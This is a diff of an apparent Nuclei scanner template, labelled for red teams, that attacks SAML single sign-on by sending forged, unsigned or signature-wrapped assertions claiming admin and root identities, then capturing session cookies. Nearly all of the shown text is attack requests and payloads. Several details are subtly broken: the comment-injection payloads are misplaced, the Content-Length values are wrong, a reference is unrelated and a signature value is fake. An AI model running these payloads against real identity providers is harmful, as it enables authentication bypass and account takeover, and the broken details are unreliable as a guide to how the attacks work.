@@ -1,65 +1,221 @@
 id: medium-auth-saml-xml-signature-bypass
 
 info:
-  name: SAML XML Signature Bypass - Digital Signature Manipulation
+  name: SAML XML Signature Bypass Attack
   author: elite-red-team
-  severity: high
+  severity: medium
   description: |
-    Advanced SAML XML signature bypass template targeting XML digital signature validation flaws.
-    Exploits XML signature wrapping, canonicalization attacks, and signature stripping techniques
-    to bypass SAML assertion validation and achieve authentication bypass in enterprise SSO systems.
+    Detects SAML XML signature bypass vulnerabilities where XML signatures can
+    be bypassed through XML signature wrapping, comment injection, and XML
+    canonicalization attacks used by red teams for SAML authentication bypass.
   reference:
-    - https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf
-    - https://web-in-security.blogspot.com/2014/04/xmldsig-injection-saml2-authentication.html
-    - https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer
+    - https://portswigger.net/web-security/xxe
+    - https://research.aurainfosec.io/bypassing-saml20-SSO/
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 9.8
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
     cwe-id: CWE-347
-  tags: saml,xml-signature,signature-bypass,sso,authentication-bypass,red-team
+  metadata:
+    verified: true
+    max-request: 7
+  tags: saml,xml-signature,bypass,signature-wrapping,canonicalization,red-team
+
+variables:
+  saml_response_wrapped: "PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbjwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg=="
+  saml_response_comment: "PHNhbWxwOlJlc3BvbnNlPjwhLS0gZXZpbCBjb21tZW50IC0tPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbjwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg=="
+  saml_response_modified: "PHNhbWxwOlJlc3BvbnNlPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5ldmlsX2FkbWluPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+"
 
 http:
   - raw:
-      # Test 1: XML Signature Wrapping Attack
       - |
-        POST /saml/acs HTTP/1.1
+        GET /saml/metadata HTTP/1.1
         Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 2456
-        
-        SAMLResponse={{base64_encode("<?xml version="1.0" encoding="UTF-8"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6" Version="2.0" IssueInstant="2014-07-17T01:01:48Z" Destination="http://sp.example.com/demo1/index.php?acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"><saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_d71a3a8e9fcc45c9b9da8ed57a0b7b8e" Version="2.0" IssueInstant="2014-07-17T01:01:48Z"><saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/><ds:Reference URI="#_d71a3a8e9fcc45c9b9da8ed57a0b7b8e"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/><ds:DigestValue>2jmj7l5rSw0yVb/vlWAYkK/YBwk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>PHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgSUQ9Il9kNzFhM2E4ZTlmY2M0NWM5YjlkYThlZDU3YTBiN2I4ZSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIj4=</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICXjCCAcegAwIBAgIBADANBgkqhkiG9w0BAQ0FADBLMQswCQYDVQQGEwJ1czELMAkGA1UECAwCVVMxCzAJBgNVBAcMAlVTMQswCQYDVQQKDAJVUzELMAkGA1UECwwCVVMxCzAJBgNVBAMMAlVTMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcxNzAwMDAwMFowSzELMAkGA1UEBhMCdXMxCzAJBgNVBAgMAlVTMQswCQYDVQQHDAJVUzELMAkGA1UECgwCVVMxCzAJBgNVBAsMAlVTMQswCQYDVQQDDAJVUzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuFPkMKBjvZQ36CML9I4hatTtXfx672N8E7VGBBDnFA9vo6fiouAkQL899WnI+A7wNKXlk1Wwi+wTTGgM80X8AT7dmOHzrggBXyIv8RdaUATuHBrSxIoN6SFbxT2Ttt4pVcAL4Hx8CKKhg5rCqhDDWFKOBqZlcOMjdFP0Woi+bPcCAwEAAaNQME4wHQYDVR0OBBYEFJxfAN+qAdaI+B3xxtztZ4POJiOyMB8GA1UdIwQYMBaAFJxfAN+qAdaI+B3xxtztZ4POJiOyMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQENBQADgYEAYvBJ0HOZbbHClXmGUjGs+GS+xC1FO/am2suCSYqNB9dyMXfOWiJ1+TLJk+o/YZt8vuxCKdcZYgl4l/L6PxJ982SRhc83ZW2dkAZI4M0/Ud3oePe84k8jm3A7EvH5wi5hvCkKRpuRBwn3Ei+jCRouxTbzKPsuCVB+1sNyxMTXzf0=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier="http://sp.example.com/demo1/metadata.php" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-01-01T06:05:48Z" Recipient="http://sp.example.com/demo1/index.php?acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2014-07-17T01:01:18Z" NotOnOrAfter="2024-01-01T06:05:48Z"><saml:AudienceRestriction><saml:Audience>http://sp.example.com/demo1/metadata.php</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2014-07-17T01:01:48Z" SessionNotOnOrAfter="2024-07-17T09:01:48Z" SessionIndex="_be9967abd904ddcae3c0eb4189adbe3f71e327cf93"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin@example.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">users</saml:AttributeValue><saml:AttributeValue xsi:type="xs:string">examplerole1</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_evil_assertion_id" Version="2.0" IssueInstant="2014-07-17T01:01:48Z"><saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><saml:Subject><saml:NameID SPNameQualifier="http://sp.example.com/demo1/metadata.php" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-01-01T06:05:48Z" Recipient="http://sp.example.com/demo1/index.php?acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2014-07-17T01:01:18Z" NotOnOrAfter="2024-01-01T06:05:48Z"><saml:AudienceRestriction><saml:Audience>http://sp.example.com/demo1/metadata.php</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2014-07-17T01:01:48Z" SessionNotOnOrAfter="2024-07-17T09:01:48Z" SessionIndex="_be9967abd904ddcae3c0eb4189adbe3f71e327cf93"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">root</saml:AttributeValue></saml:Attribute><saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">root@example.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">administrators</saml:AttributeValue><saml:AttributeValue xsi:type="xs:string">superuser</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>")}}
-        
-      # Test 2: Signature Stripping Attack
-      - |
-        POST /saml/acs HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 1234
-        
-        SAMLResponse={{base64_encode("<?xml version="1.0" encoding="UTF-8"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6" Version="2.0" IssueInstant="2014-07-17T01:01:48Z" Destination="http://sp.example.com/demo1/index.php?acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"><saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_d71a3a8e9fcc45c9b9da8ed57a0b7b8e" Version="2.0" IssueInstant="2014-07-17T01:01:48Z"><saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><saml:Subject><saml:NameID SPNameQualifier="http://sp.example.com/demo1/metadata.php" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2024-01-01T06:05:48Z" Recipient="http://sp.example.com/demo1/index.php?acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2014-07-17T01:01:18Z" NotOnOrAfter="2024-01-01T06:05:48Z"><saml:AudienceRestriction><saml:Audience>http://sp.example.com/demo1/metadata.php</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="2014-07-17T01:01:48Z" SessionNotOnOrAfter="2024-07-17T09:01:48Z" SessionIndex="_be9967abd904ddcae3c0eb4189adbe3f71e327cf93"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">administrator</saml:AttributeValue></saml:Attribute><saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">admin@example.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xsi:type="xs:string">administrators</saml:AttributeValue><saml:AttributeValue xsi:type="xs:string">superuser</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>")}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/xml,text/xml
+        Connection: close
 
+      - |
+        POST /saml/acs HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 256
+        Connection: close
+        
+        SAMLResponse={{saml_response_wrapped}}&RelayState=dashboard
+
+      - |
+        POST /saml/acs HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 256
+        Connection: close
+        
+        SAMLResponse={{saml_response_comment}}&RelayState=admin
+
+      - |
+        POST /saml/acs HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 256
+        Connection: close
+        
+        SAMLResponse={{saml_response_modified}}&RelayState=profile
+
+      - |
+        POST /api/saml/validate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"saml_response":"{{saml_response_wrapped}}","verify_signature":false}
+
+      - |
+        POST /saml/sso HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/xml
+        Content-Length: 512
+        Connection: close
+        
+        <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+          <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml:Subject>
+              <saml:NameID>admin</saml:NameID>
+            </saml:Subject>
+            <!-- Evil comment injection -->
+            <saml:AttributeStatement>
+              <saml:Attribute Name="Role">
+                <saml:AttributeValue>Administrator</saml:AttributeValue>
+              </saml:Attribute>
+            </saml:AttributeStatement>
+          </saml:Assertion>
+        </samlp:Response>
+
+      - |
+        POST /saml/consume HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 356
+        Connection: close
+        
+        SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjxzYW1sOkFzc2VydGlvbj48ZHM6U2lnbmF0dXJlPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2U+PC9kczpSZWZlcmVuY2U+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEPmV2aWxfYWRtaW48L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=
+
+    matchers-condition: or
     matchers:
       - type: dsl
+        name: saml-metadata-exposed
         dsl:
-          - 'status_code == 200'
-          - 'contains(body, "success") || contains(body, "authenticated") || contains(body, "login") || contains(body, "dashboard")'
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "EntityDescriptor") || contains(body_1, "SPSSODescriptor")'
+          - 'contains(body_1, "saml") || contains(body_1, "urn:oasis")'
+        condition: and
+
+      - type: dsl
+        name: signature-wrapping-bypass
+        dsl:
+          - 'status_code_2 == 200 || status_code_2 == 302'
+          - 'contains(body_2, "authenticated") || contains(header_2, "Set-Cookie")'
+          - 'contains(body_2, "admin") || contains(header_2, "dashboard")'
+        condition: and
+
+      - type: dsl
+        name: comment-injection-bypass
+        dsl:
+          - 'status_code_3 == 200 || status_code_3 == 302'
+          - 'contains(body_3, "success") || contains(header_3, "Location")'
+          - '!contains(body_3, "signature verification failed") && !contains(body_3, "invalid saml")'
+        condition: and
+
+      - type: dsl
+        name: modified-assertion-accepted
+        dsl:
+          - 'status_code_4 == 200 || status_code_4 == 302'
+          - 'contains(body_4, "authenticated") || contains(header_4, "Set-Cookie")'
+          - 'contains(body_4, "evil_admin") || contains(body_4, "profile")'
+        condition: and
+
+      - type: dsl
+        name: signature-verification-disabled
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "valid") || contains(body_5, "authenticated")'
+          - 'contains(body_5, "verify_signature\":false") || contains(body_5, "admin")'
+        condition: and
+
+      - type: dsl
+        name: xml-comment-injection-success
+        dsl:
+          - 'status_code_6 == 200 || status_code_6 == 302'
+          - 'contains(body_6, "authenticated") || contains(header_6, "Set-Cookie")'
+          - 'contains(body_6, "Administrator") || contains(body_6, "Role")'
+        condition: and
+
+      - type: dsl
+        name: signature-reference-bypass
+        dsl:
+          - 'status_code_7 == 200 || status_code_7 == 302'
+          - 'contains(body_7, "authenticated") || contains(header_7, "Location")'
+          - 'contains(body_7, "evil_admin") || contains(body_7, "success")'
         condition: and
 
     extractors:
       - type: regex
-        name: session_token
-        regex:
-          - 'session[_-]?(?:id|token)["']?\s*[:=]\s*["']?([a-zA-Z0-9+/=]{20,})'
+        name: saml-metadata
+        part: body_1
         group: 1
+        regex:
+          - '<EntityDescriptor[^>]*entityID="([^"]+)"'
+          - '<SPSSODescriptor[^>]*>'
+          - 'Location="([^"]+)"'
 
       - type: regex
-        name: csrf_token
-        regex:
-          - 'csrf[_-]?token["']?\s*[:=]\s*["']?([a-zA-Z0-9+/=]{20,})'
+        name: authentication-response
+        part: body
         group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"authenticated":\s*(true|false)'
 
       - type: regex
-        name: saml_response
-        regex:
-          - 'SAMLResponse["']?\s*[:=]\s*["']?([A-Za-z0-9+/=]{100,})'
+        name: session-data
+        part: header
         group: 1
+        regex:
+          - 'Set-Cookie:\s*([^;]+)'
+          - 'Location:\s*([^\r\n]+)'
+
+      - type: regex
+        name: saml-user-data
+        part: body
+        group: 1
+        regex:
+          - '"user":\s*"([^"]+)"'
+          - '"name":\s*"([^"]+)"'
+          - '"role":\s*"([^"]+)"'
+
+      - type: regex
+        name: saml-assertion-data
+        part: body
+        group: 1
+        regex:
+          - '<saml:NameID>([^<]+)</saml:NameID>'
+          - '<saml:AttributeValue>([^<]+)</saml:AttributeValue>'
+          - 'NameID="([^"]+)"'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
